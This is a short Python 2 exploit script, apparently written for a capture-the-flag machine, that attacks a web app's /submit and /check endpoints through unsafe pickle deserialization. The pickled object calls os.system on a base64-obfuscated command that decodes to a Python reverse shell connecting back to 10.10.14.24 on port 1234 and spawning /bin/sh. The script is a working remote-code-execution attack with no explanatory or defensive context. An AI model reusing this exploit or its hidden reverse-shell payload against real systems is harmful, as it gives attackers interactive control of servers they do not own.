#!/usr/bin/env python2
#  -*- coding: utf-8 -*-
# First draft
__author__ = 'nighter@nighter.se'

import string
import random
import base64
import cPickle
import os
import time

from requests import post
from hashlib import md5

HOST = 'http://10.10.10.70'
COMMAND = 'echo cHl0aG9uIC1jICdpbXBvcnQgc29ja2V0LHN1YnByb2Nlc3Msb3M7cz1zb2NrZXQuc29ja2V0KHNvY2tldC5BRl9JTkVULHNvY2tldC5TT0NLX1NUUkVBTSk7cy5jb25uZWN0KCgiMTAuMTAuMTQuMjQiLDEyMzQpKTtvcy5kdXAyKHMuZmlsZW5vKCksMCk7IG9zLmR1cDIocy5maWxlbm8oKSwxKTsgb3MuZHVwMihzLmZpbGVubygpLDIpO3A9c3VicHJvY2Vzcy5jYWxsKFsiL2Jpbi9zaCIsIi1pIl0pOyc=|base64 -d|bash'

class PicklePayload(object):
    def __reduce__(self):
        return (os.system, (COMMAND,))

def createPayload():
    return cPickle.dumps(PicklePayload())

def submit(char='', quote=''):

    data = {"character": char, "quote": quote}
    submit = post(HOST + '/submit', data=data)
    if submit.status_code == 200:
        print("Submit ok.")
    else:
        print("Submit error.")

def check(p_id):
    p = post(HOST + '/check', data={"id": p_id})
    print(p.status_code)

def exploit():

    char = createPayload() + "homer"
    quote = "1337"
    p_id = md5(char + quote).hexdigest()

    submit(char, quote)
    time.sleep(1)
    check(p_id)

if __name__ == '__main__':

    exploit()